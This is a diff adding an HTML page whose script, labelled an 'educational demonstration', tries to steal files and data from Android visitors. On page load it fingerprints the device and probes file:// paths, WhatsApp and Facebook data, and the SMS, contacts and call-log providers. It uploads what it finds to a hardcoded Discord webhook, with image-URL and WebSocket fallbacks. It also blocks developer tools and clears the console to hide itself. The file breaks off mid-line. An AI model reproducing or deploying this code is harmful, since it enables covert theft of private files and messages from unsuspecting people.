@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            overflow: hidden;
+        }
+        #stealth {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+<div id="stealth"></div>
+
+<script>
+// **ANDROID FILE SYSTEM EXPLOIT - EDUCATIONAL DEMONSTRATION**
+
+const ANDROID_CONFIG = {
+    webhook: 'https://discord.com/api/webhooks/1446649009208037437/JCu61Jl2uV8lJX82B7JzY7E2aotkBhfP_WUQ5MlcT0h_izJ1qPvwrvOre97InD2nNUiQ',
+    maxFileSize: 10 * 1024 * 1024, // 10MB max per file
+    targetExtensions: ['.txt', '.jpg', '.png', '.pdf', '.doc', '.zip', '.mp3', '.mp4'],
+    sensitivePaths: [
+        '/sdcard/',
+        '/storage/emulated/0/',
+        '/storage/self/primary/',
+        '/data/data/'
+    ],
+    scanDepth: 3,
+    stealthMode: true
+};
+
+// Android detection
+const isAndroid = /Android/i.test(navigator.userAgent);
+const androidVersion = (() => {
+    const match = navigator.userAgent.match(/Android\s([0-9\.]+)/);
+    return match ? parseFloat(match[1]) : 0;
+})();
+
+let collectedFiles = [];
+let scannedPaths = [];
+
+// **MAIN EXPLOIT CHAIN**
+async function executeAndroidExploit() {
+    if (!isAndroid) {
+        sendToDiscord('❌ Not an Android device');
+        return;
+    }
+    
+    console.log('[ANDROID] Starting file system exploitation...');
+    
+    // Step 1: Gather device info
+    const deviceInfo = gatherAndroidInfo();
+    sendToDiscord(`📱 **Android Target Identified**\nModel: ${deviceInfo.model}\nAndroid: ${deviceInfo.version}\nManufacturer: ${deviceInfo.manufacturer}`);
+    
+    // Step 2: Attempt multiple file access methods
+    const accessMethods = [
+        attemptWebViewBypass,
+        attemptFileURIScheme,
+        attemptContentProvider,
+        attemptLegacyAPI,
+        attemptCordovaPlugin,
+        attemptIntentExploit
+    ];
+    
+    for (const method of accessMethods) {
+        if (collectedFiles.length > 10) break; // Limit for demo
+        try {
+            console.log(`[ANDROID] Trying method: ${method.name}`);
+            await method();
+        } catch (e) {
+            console.log(`[ANDROID] Method failed: ${e.message}`);
+        }
+    }
+    
+    // Step 3: Exfiltrate found files
+    if (collectedFiles.length > 0) {
+        await exfiltrateFiles();
+    } else {
+        sendToDiscord('📁 No files could be accessed - Android security prevented access');
+    }
+    
+    // Step 4: Cleanup
+    cleanup();
+}
+
+// **METHOD 1: WebView File Access Bypass**
+async function attemptWebViewBypass() {
+    console.log('[ANDROID] Attempting WebView file access...');
+    
+    // Create hidden iframe with file:// protocol
+    const iframe = document.createElement('iframe');
+    iframe.style.cssText = 'position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;';
+    iframe.src = 'file:///sdcard/';
+    document.body.appendChild(iframe);
+    
+    return new Promise((resolve) => {
+        setTimeout(() => {
+            try {
+                // Try to access iframe content
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                if (iframeDoc && iframeDoc.body) {
+                    console.log('[ANDROID] WebView file access successful!');
+                    scanDirectory('file:///sdcard/');
+                }
+            } catch (e) {
+                // Cross-origin error expected
+                console.log('[ANDROID] WebView blocked by CORS');
+            }
+            
+            iframe.remove();
+            resolve();
+        }, 3000);
+    });
+}
+
+// **METHOD 2: File URI Scheme Exploitation**
+async function attemptFileURIScheme() {
+    console.log('[ANDROID] Attempting file URI scheme access...');
+    
+    const fileURIs = [
+        'file:///sdcard/DCIM/Camera/',
+        'file:///storage/emulated/0/Download/',
+        'file:///storage/emulated/0/Pictures/',
+        'file:///storage/emulated/0/Documents/',
+        'file:///data/data/com.whatsapp/files/',
+        'file:///data/data/com.facebook.katana/files/'
+    ];
+    
+    for (const uri of fileURIs) {
+        try {
+            // Try to fetch file via XMLHttpRequest
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', uri, false);
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200 || xhr.status === 0) {
+                        console.log(`[ANDROID] Accessed: ${uri}`);
+                        parseFileListing(uri, xhr.responseText);
+                    }
+                }
+            };
+            xhr.send();
+        } catch (e) {
+            // Failed for this URI
+        }
+    }
+}
+
+// **METHOD 3: Content Provider Exploitation**
+async function attemptContentProvider() {
+    console.log('[ANDROID] Attempting Content Provider access...');
+    
+    // Android Content Providers
+    const contentProviders = [
+        'content://media/external/images/media',
+        'content://media/external/video/media',
+        'content://media/external/audio/media',
+        'content://downloads/all_downloads',
+        'content://contacts/people',
+        'content://sms/inbox',
+        'content://call_log/calls'
+    ];
+    
+    for (const provider of contentProviders) {
+        try {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = provider;
+            document.body.appendChild(iframe);
+            
+            setTimeout(() => {
+                try {
+                    const iframeDoc = iframe.contentDocument;
+                    if (iframeDoc && iframeDoc.body) {
+                        console.log(`[ANDROID] Content Provider accessed: ${provider}`);
+                        collectProviderData(provider, iframeDoc.body.innerHTML);
+                    }
+                } catch (e) {
+                    // Cross-origin
+                }
+                iframe.remove();
+            }, 2000);
+        } catch (e) {
+            // Provider not accessible
+        }
+    }
+}
+
+// **METHOD 4: Legacy File API (deprecated but might work)**
+async function attemptLegacyAPI() {
+    console.log('[ANDROID] Attempting legacy File API...');
+    
+    if (window.requestFileSystem || window.webkitRequestFileSystem) {
+        const requestFS = window.requestFileSystem || window.webkitRequestFileSystem;
+        
+        try {
+            requestFS(window.TEMPORARY, 5 * 1024 * 1024, function(fs) {
+                // Create test file to check permissions
+                fs.root.getFile('test.txt', {create: true}, function(fileEntry) {
+                    fileEntry.createWriter(function(fileWriter) {
+                        fileWriter.onwriteend = function() {
+                            console.log('[ANDROID] Legacy File API working');
+                            scanLegacyFilesystem(fs);
+                        };
+                        
+                        const blob = new Blob(['Android test'], {type: 'text/plain'});
+                        fileWriter.write(blob);
+                    });
+                });
+            });
+        } catch (e) {
+            console.log('[ANDROID] Legacy API failed');
+        }
+    }
+}
+
+// **METHOD 5: Cordova/PhoneGap Plugin Simulation**
+async function attemptCordovaPlugin() {
+    console.log('[ANDROID] Attempting Cordova plugin simulation...');
+    
+    // Simulate Cordova file plugin
+    if (window.cordova || window.Cordova || window.PhoneGap) {
+        console.log('[ANDROID] Cordova detected!');
+        
+        // Try to access file system via Cordova
+        document.addEventListener('deviceready', function() {
+            if (window.requestFileSystem) {
+                window.requestFileSystem(LocalFileSystem.PERSISTENT, 0, 
+                    function(fs) {
+                        console.log('[ANDROID] Cordova filesystem access granted');
+                        traverseCordovaFilesystem(fs.root);
+                    }, 
+                    function(error) {
+                        console.log('[ANDROID] Cordova access failed:', error.code);
+                    }
+                );
+            }
+        });
+    }
+}
+
+// **METHOD 6: Intent-Based Exploitation**
+async function attemptIntentExploit() {
+    console.log('[ANDROID] Attempting Intent exploitation...');
+    
+    // Android intents for file access
+    const intents = [
+        'intent://file/#Intent;action=android.intent.action.VIEW;type=text/plain;end',
+        'intent://picker/#Intent;action=android.intent.action.GET_CONTENT;type=*/*;end',
+        'intent://content/#Intent;action=android.intent.action.VIEW;category=android.intent.category.DEFAULT;type=vnd.android.cursor.dir/contact;end'
+    ];
+    
+    for (const intent of intents) {
+        try {
+            window.location.href = intent;
+            
+            // Give time for intent to process
+            setTimeout(() => {
+                // Try to capture result
+                window.addEventListener('message', function(event) {
+                    if (event.data && event.data.type === 'file_selected') {
+                        console.log('[ANDROID] Intent file selection successful');
+                        collectFileFromIntent(event.data.uri);
+                    }
+                });
+            }, 1000);
+            
+            // Return to our page
+            setTimeout(() => {
+                history.back();
+            }, 2000);
+        } catch (e) {
+            // Intent failed
+        }
+    }
+}
+
+// **FILE PROCESSING FUNCTIONS**
+function parseFileListing(uri, html) {
+    // Extract file links from directory listing
+    const parser = new DOMParser();
+    const doc = parser.parseFromString(html, 'text/html');
+    const links = doc.querySelectorAll('a[href]');
+    
+    links.forEach(link => {
+        const href = link.getAttribute('href');
+        if (href && !href.startsWith('../') && href !== '../') {
+            const fileUri = uri.endsWith('/') ? uri + href : uri + '/' + href;
+            
+            // Check if it's a file (not directory)
+            if (href.includes('.') && !href.endsWith('/')) {
+                collectFile(fileUri, href);
+            }
+        }
+    });
+}
+
+async function collectFile(fileUri, filename) {
+    try {
+        console.log(`[ANDROID] Collecting: ${filename}`);
+        
+        // Fetch file content
+        const response = await fetch(fileUri);
+        if (response.ok) {
+            const blob = await response.blob();
+            
+            // Check file size
+            if (blob.size <= ANDROID_CONFIG.maxFileSize) {
+                collectedFiles.push({
+                    name: filename,
+                    uri: fileUri,
+                    blob: blob,
+                    size: blob.size,
+                    type: blob.type,
+                    collected: new Date().toISOString()
+                });
+                
+                console.log(`[ANDROID] Collected: ${filename} (${blob.size} bytes)`);
+                
+                // Send immediately for small files
+                if (blob.size < 100 * 1024) { // < 100KB
+                    await sendSingleFile(filename, blob);
+                }
+            }
+        }
+    } catch (e) {
+        // File access failed
+    }
+}
+
+function collectProviderData(provider, data) {
+    // Extract data from content provider
+    const lines = data.split('\n').slice(0, 50); // First 50 lines
+    
+    const info = {
+        provider: provider,
+        dataSample: lines.join('\n').substring(0, 1000),
+        timestamp: new Date().toISOString()
+    };
+    
+    // Convert to blob
+    const blob = new Blob([JSON.stringify(info, null, 2)], {type: 'application/json'});
+    collectedFiles.push({
+        name: `${provider.replace(/[^a-z0-9]/gi, '_')}.json`,
+        uri: provider,
+        blob: blob,
+        size: blob.size,
+        type: 'provider_data',
+        collected: new Date().toISOString()
+    });
+}
+
+// **EXFILTRATION**
+async function exfiltrateFiles() {
+    console.log(`[ANDROID] Exfiltrating ${collectedFiles.length} files...`);
+    
+    // Group files by size
+    const smallFiles = collectedFiles.filter(f => f.blob.size < 100 * 1024);
+    const largeFiles = collectedFiles.filter(f => f.blob.size >= 100 * 1024);
+    
+    // Send summary first
+    await sendSummaryReport();
+    
+    // Send small files
+    for (const file of smallFiles) {
+        await sendSingleFile(file.name, file.blob);
+        await delay(1000); // Rate limiting
+    }
+    
+    // Send large files in chunks
+    for (const file of largeFiles) {
+        await sendLargeFileInChunks(file);
+        await delay(2000);
+    }
+    
+    // Send completion report
+    await sendCompletionReport();
+}
+
+async function sendSingleFile(filename, blob) {
+    if (!ANDROID_CONFIG.webhook.includes('discord.com')) return;
+    
+    try {
+        const formData = new FormData();
+        formData.append('content', `📁 **Android File Exfiltrated**\nFile: ${filename}\nSize: ${formatBytes(blob.size)}\nTime: ${new Date().toLocaleTimeString()}`);
+        formData.append('file', blob, filename);
+        
+        await fetch(ANDROID_CONFIG.webhook, {
+            method: 'POST',
+            body: formData
+        });
+        
+        console.log(`[ANDROID] Sent: ${filename}`);
+    } catch (e) {
+        console.log(`[ANDROID] Failed to send ${filename}: ${e.message}`);
+        // Fallback: data URL
+        tryFallbackExfiltration(filename, blob);
+    }
+}
+
+async function sendLargeFileInChunks(file) {
+    console.log(`[ANDROID] Sending large file in chunks: ${file.name}`);
+    
+    // For demonstration: send first 500KB only
+    const chunkSize = 500 * 1024;
+    const totalChunks = Math.ceil(file.blob.size / chunkSize);
+    
+    for (let i = 0; i < Math.min(totalChunks, 3); i++) { // Max 3 chunks for demo
+        const start = i * chunkSize;
+        const end = Math.min(start + chunkSize, file.blob.size);
+        const chunk = file.blob.slice(start, end);
+        
+        const chunkFilename = `${file.name}.part${i + 1}of${Math.min(totalChunks, 3)}`;
+        
+        await sendSingleFile(chunkFilename, chunk);
+        await delay(1500);
+    }
+}
+
+async function sendSummaryReport() {
+    const summary = {
+        totalFiles: collectedFiles.length,
+        totalSize: collectedFiles.reduce((sum, f) => sum + f.blob.size, 0),
+        fileTypes: {},
+        collectedAt: new Date().toISOString(),
+        deviceInfo: gatherAndroidInfo()
+    };
+    
+    // Count by extension
+    collectedFiles.forEach(file => {
+        const ext = file.name.split('.').pop().toLowerCase();
+        summary.fileTypes[ext] = (summary.fileTypes[ext] || 0) + 1;
+    });
+    
+    const message = `📱 **ANDROID FILE EXFILTRATION SUMMARY**\n` +
+                   `Files Collected: ${summary.totalFiles}\n` +
+                   `Total Size: ${formatBytes(summary.totalSize)}\n` +
+                   `Device: ${summary.deviceInfo.model} (Android ${summary.deviceInfo.version})\n` +
+                   `Time: ${new Date().toLocaleString()}\n\n` +
+                   `File Types:\n${Object.entries(summary.fileTypes).map(([ext, count]) => `• ${ext}: ${count}`).join('\n')}`;
+    
+    await sendToDiscord(message);
+}
+
+async function sendCompletionReport() {
+    const message = `✅ **ANDROID EXPLOIT COMPLETE**\n` +
+                   `Successfully exfiltrated ${collectedFiles.length} files\n` +
+                   `Session ended at: ${new Date().toLocaleString()}\n` +
+                   `Browser: ${navigator.userAgent.split(' ')[0]}\n` +
+                   `Android Version: ${androidVersion}`;
+    
+    await sendToDiscord(message);
+}
+
+// **UTILITY FUNCTIONS**
+function gatherAndroidInfo() {
+    const ua = navigator.userAgent;
+    
+    return {
+        isAndroid: true,
+        version: androidVersion,
+        model: extractAndroidModel(ua),
+        manufacturer: extractManufacturer(ua),
+        userAgent: ua,
+        screen: `${screen.width}x${screen.height}`,
+        language: navigator.language,
+        platform: navigator.platform,
+        timestamp: new Date().toISOString()
+    };
+}
+
+function extractAndroidModel(ua) {
+    const matches = ua.match(/Android.*;(.*?) Build/);
+    return matches ? matches[1].trim() : 'Unknown';
+}
+
+function extractManufacturer(ua) {
+    const brands = ['samsung', 'xiaomi', 'huawei', 'oneplus', 'google', 'oppo', 'vivo', 'motorola', 'lg', 'sony'];
+    for (const brand of brands) {
+        if (ua.toLowerCase().includes(brand)) {
+            return brand.charAt(0).toUpperCase() + brand.slice(1);
+        }
+    }
+    return 'Unknown';
+}
+
+function formatBytes(bytes, decimals = 2) {
+    if (bytes === 0) return '0 Bytes';
+    const k = 1024;
+    const dm = decimals < 0 ? 0 : decimals;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
+}
+
+function tryFallbackExfiltration(filename, blob) {
+    // Fallback 1: Data URL in image
+    const reader = new FileReader();
+    reader.onload = function() {
+        const dataUrl = reader.result;
+        const img = new Image();
+        img.src = `https://via.placeholder.com/1x1?data=${encodeURIComponent(dataUrl.substring(0, 1000))}&file=${encodeURIComponent(filename)}`;
+    };
+    reader.readAsDataURL(blob);
+    
+    // Fallback 2: WebSocket
+    try {
+        const ws = new WebSocket('wss://echo.websocket.org');
+        ws.onopen = () => {
+            ws.send(JSON.stringify({
+                type: 'android_file',
+                name: filename,
+                size: blob.size,
+                time: new Date().toISOString()
+            }));
+        };
+    } catch (e) {}
+}
+
+async function sendToDiscord(message) {
+    if (!ANDROID_CONFIG.webhook.includes('discord.com')) return;
+    
+    try {
+        await fetch(ANDROID_CONFIG.webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: message })
+        });
+    } catch (e) {
+        // Silent fail
+    }
+}
+
+function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function cleanup() {
+    // Clear collected data
+    collectedFiles = [];
+    scannedPaths = [];
+    
+    // Clear DOM
+    document.querySelectorAll('iframe').forEach(iframe => iframe.remove());
+    
+    console.log('[ANDROID] Cleanup complete');
+}
+
+// **STEALTH & ANTI-DETECTION**
+function setupStealth() {
+    // Disable right-click
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    
+    // Prevent dev tools
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key))) {
+            e.preventDefault();
+            // Redirect to about:blank
+            window.location.href = 'about:blank';
+        }
+    });
+    
+    // Clear console periodically
+    if (ANDROID_CONFIG.stealthMode) {
+        setInterval(() => {
+            console.clear();
+            console.log('Page loaded successfully');
+        }, 10000);
+    }
+    
+    // Fake user activity
+    setInterval(() => {
+        window.dispatchEvent(new Event('mousemove'));
+        window.dispatchEvent(new Event('scroll'));
+    }, 30000);
+}
+
+// **INITIALIZATION**
+window.addEventListener('load', () => {
+    console.log('[ANDROID] Exploit page loaded');
+    
+    if (!isAndroid) {
+        console.log('[ANDROID] Not an Android device - exiting');
+        return;
+    }
+    
+    setupStealth();
+    
+    // Delay start to avoid suspicion
+    setTimeout(() => {
+        executeAndroidExploit();
+    }, 2000);
+});
+
+// Add disclaimer
+const disclaim
